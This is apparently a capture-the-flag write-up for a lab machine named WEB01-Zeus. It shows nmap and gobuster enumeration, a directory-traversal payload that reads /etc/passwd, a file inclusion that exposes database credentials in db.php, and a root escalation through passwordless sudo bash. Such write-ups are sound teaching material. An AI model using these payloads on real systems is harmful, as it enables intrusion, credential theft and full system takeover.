# WEB01-Zeus

## NMAP
```
nmap -p- -A -T5 10.10.110.205 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-29 23:37 BST
Warning: 10.10.110.205 giving up on port because retransmission cap hit (2).
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 12.93% done; ETC: 23:41 (0:03:22 remaining)
Nmap scan report for 10.10.110.205
Host is up (0.077s latency).
Not shown: 65064 closed tcp ports (conn-refused), 469 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8e:79:8a:89:64:3a:ab:16:c0:70:c5:f0:77:b5:3a:8e (ECDSA)
|_  256 8a:1d:e9:f9:8e:c8:7c:b9:28:27:6f:a6:25:77:4d:3d (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Genesis Blog
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 258.09 seconds
```

## Directory Traversal
```
http://10.10.110.205/blog.php?article=../../../../../etc/passwd
```
There were no SSH keys

## Gobuster
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.110.205 -x php -t 50
```
## db.php
10.10.110.205/db.php came up with nothing

```
http://10.10.110.205/blog.php?article=db.php
```

### Page Source
```
       <?php
$servername = "localhost";
$username = "panos";
$password = "supersecretpassword";

$conn = new mysqli($servername, $username, $password);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully";
?>
```
USER: panos
PASSWORD: supersecretpassword

## PrivEsc
```
panos@WEB01-Zeus:~$ sudo -l
Matching Defaults entries for panos on WEB01-Zeus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User panos may run the following commands on WEB01-Zeus:
    (ALL) NOPASSWD: /bin/bash
panos@WEB01-Zeus:~$ sudo bash
root@WEB01-Zeus:/home/panos#
```
